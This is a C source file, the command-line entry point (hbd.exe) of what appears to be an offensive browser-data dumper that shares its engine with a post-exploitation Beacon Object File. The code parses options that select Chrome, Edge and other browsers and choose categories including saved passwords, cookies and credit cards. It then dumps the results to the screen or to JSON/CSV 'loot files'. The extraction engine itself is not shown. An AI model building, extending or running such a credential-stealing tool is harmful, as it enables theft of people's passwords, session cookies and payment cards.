/* standalone/entry.c - standalone CLI (hbd.exe), same engine as the BOF.
 *
 *   hbd.exe [-b all|chrome|edge|...] [-c all|passwords,cookies,...]
 *           [-f json|csv] [-o outdir] [-v] [-q]
 *
 * Default: prints a human-readable dump to stdout and writes NOTHING to disk
 * (except throwaway DB staging copies under %TEMP%). Pass -o <dir> to save
 * JSON/CSV loot files; -v additionally streams the raw JSON/CSV.
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "../core/bd.h"

static void log_printf(void *ctx, const char *fmt, ...) {
    va_list ap;
    (void)ctx;
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    printf("\n");
    fflush(stdout);
}

#define CHUNK_SIZE 3800
static void chunk_stdout(void *ctx, const char *data, int len) {
    (void)ctx;
    {
        int off = 0;
        while (off < len) {
            int take = len - off;
            if (take > CHUNK_SIZE) take = CHUNK_SIZE;
            fwrite(data + off, 1, (size_t)take, stdout);
            off += take;
        }
        fflush(stdout);
    }
}

int main(int argc, char **argv) {
    const char *brKey = "all";
    const char *catSpec = "all";
    const char *fmtSpec = "json";
    const char *outdirArg = NULL;
    int verbose = 0, quiet = 0;
    int i, files, catMask, fmt = BD_FMT_JSON;
    bd_out out;

    for (i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-b") && i + 1 < argc) brKey = argv[++i];
        else if (!strcmp(argv[i], "-c") && i + 1 < argc) catSpec = argv[++i];
        else if (!strcmp(argv[i], "-f") && i + 1 < argc) fmtSpec = argv[++i];
        else if (!strcmp(argv[i], "-o") && i + 1 < argc) outdirArg = argv[++i];
        else if (!strcmp(argv[i], "-v")) verbose = 1;
        else if (!strcmp(argv[i], "-q")) quiet = 1;
        else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
            printf("usage: hbd.exe [-b all|chrome|edge|...] [-c all|passwords,cookies,history,downloads,creditcards,bookmarks]\n"
                   "               [-f json|csv] [-o outdir] [-v] [-q]\n"
                   "  default: human-readable output to stdout, no loot files\n"
                   "  -o dir : save JSON/CSV loot files to dir\n"
                   "  -v     : also stream raw JSON/CSV\n");
            return 0;
        }
    }
    if (fmtSpec[0] == 'c' || fmtSpec[0] == 'C') fmt = BD_FMT_CSV;
    catMask = bd_cat_mask_parse(catSpec);

    out.logf = quiet ? NULL : log_printf;
    out.chunk = chunk_stdout;
    out.ctx = NULL;
    out.outDir = outdirArg;   /* NULL default = stdout mode, no files */
    out.fmt = fmt;
    out.verbose = verbose;
    out.human = 1;            /* readable rows are the default */

    files = bd_run(brKey, catMask, &out, NULL);
    return files < 0 ? 1 : 0;
}
